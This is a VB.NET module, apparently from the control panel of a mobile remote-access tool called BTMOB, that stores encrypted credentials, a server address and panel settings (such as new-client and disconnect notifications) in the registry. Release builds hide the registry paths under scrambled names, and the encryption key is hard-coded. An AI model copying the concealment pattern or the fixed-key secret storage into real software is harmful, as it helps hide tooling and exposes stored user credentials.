Imports Microsoft.Win32

Module BTRegistry

    Structure Regz
        Const Language = "LANG"
        Const pkey = "pin"
        Const cokey = "con"
        Const uemail = "E-M"
        Const upass = "P-A"
        Const hwidassist = "hd"
        Const notify_sund = "notys"
        Const serv_adres = "serverad"
    End Structure

    ' "Software\Data\User\Settings\{B3D4T4B9-2F49-4C9M-B3O8-90F2F1B2E81}"


#If DEBUG Then
    Private Const RegistryPath As String = "Software\BTMOB"
    Private Const RegistryPath_settings As String = "Software\BTMOB\Settings"

#Else
     Private Const RegistryPath As String = "Software\StaDstrs\ageU\tein\O1I4K5J6H7H3D24D5A8F9"
     Private Const RegistryPath_settings As String = "Software\aUatg\Dte\netSsrsi\V8H847D4N2K8Z7A9L2K4"
#End If

    ' Function to add or update a value in the registry
    Public Sub AddOrUpdateValue(ByVal valueName As String, ByVal value As Object)
        Try
            Dim registryKey As RegistryKey = Registry.CurrentUser.OpenSubKey(RegistryPath, True)
            If registryKey Is Nothing Then
                registryKey = Registry.CurrentUser.CreateSubKey(RegistryPath)
            End If

            registryKey.SetValue(valueName, Encrypt(value.ToString, "BT-MOB" + "yaarsa.com" + "Software"), RegistryValueKind.String)
            registryKey.Close()
        Catch ex As Exception
            Console.WriteLine("Error while adding/updating value: " & ex.Message)
        End Try
    End Sub

    ' Function to get a value from the registry
    Public Function GetValue(ByVal valueName As String, ByVal defaultValue As Object) As Object
        Try
            Using registryKey As RegistryKey = Registry.CurrentUser.OpenSubKey(RegistryPath, False)
                If registryKey IsNot Nothing Then
                    Return Decrypt(registryKey.GetValue(valueName, defaultValue).ToString, "BT-MOB" + "yaarsa.com" + "Software")
                Else
                    Return defaultValue
                End If
            End Using
        Catch ex As Exception
            Console.WriteLine("Error while getting value: " & ex.Message)
            Return defaultValue
        End Try
    End Function

    ' Function to remove a value from the registry
    Public Sub RemoveValue(ByVal valueName As String)
        Try
            Dim registryKey As RegistryKey = Registry.CurrentUser.OpenSubKey(RegistryPath, True)
            If registryKey IsNot Nothing Then
                registryKey.DeleteValue(valueName, False)
                registryKey.Close()
            End If
        Catch ex As Exception
            Console.WriteLine("Error while removing value: " & ex.Message)
        End Try
    End Sub

    ' Function to remove the entire subkey and all its values from the registry
    Public Sub RemoveSubKeyTree()
        Try
            Registry.CurrentUser.DeleteSubKeyTree(RegistryPath, False)
        Catch ex As Exception
            Console.WriteLine("Error while removing subkey tree: " & ex.Message)
        End Try
    End Sub

    '----------------Settings

    Structure BTSettings
        Const Use_notify = "Notifications"
        Const Use_sound = "Sounds"
        'Const Notify_command = "Commandnotify"
        Const Notify_mobs = "MobNotify"
        Const Notify_downloads = "downnotify"
        Const Notify_disconnect = "discnotufy"
        Const Notify_newcli = "newclinotify"
        Const UserAgent = "uagent"
        Const Defconfig = "Defconf"
        Const fileviewstyle = "fileview"
        Const autothumbs = "autothumbs"
        Const autosave = "auotsave"
        Const hideEfiles = "emptyfiles"
        Const hideEfolder = "emptyfolder"

    End Structure
    Public Sub WriteBool(ByVal keyName As String, ByVal value As Boolean)
        Try
            Dim registryKey As RegistryKey = Registry.CurrentUser.OpenSubKey(RegistryPath_settings, True)
            If registryKey Is Nothing Then
                registryKey = Registry.CurrentUser.CreateSubKey(RegistryPath_settings)
            End If

            registryKey.SetValue(keyName, If(value, 1, 0), RegistryValueKind.DWord)
            registryKey.Close()
        Catch ex As Exception
            Console.WriteLine("Error while writing Boolean value: " & ex.Message)
        End Try
    End Sub

    ' Function to read a Boolean value from the registry
    Public Function ReadBool(ByVal keyName As String, Optional ByVal defaultValue As Boolean = False) As Boolean
        Try
            Dim registryKey As RegistryKey = Registry.CurrentUser.OpenSubKey(RegistryPath_settings, False)
            If registryKey IsNot Nothing Then
                Dim value As Object = registryKey.GetValue(keyName, If(defaultValue, 1, 0))
                registryKey.Close()
                Return CInt(value) = 1
            Else
                Return defaultValue
            End If
        Catch ex As Exception
            Console.WriteLine("Error while reading Boolean value: " & ex.Message)
            Return defaultValue
        End Try
    End Function

End Module
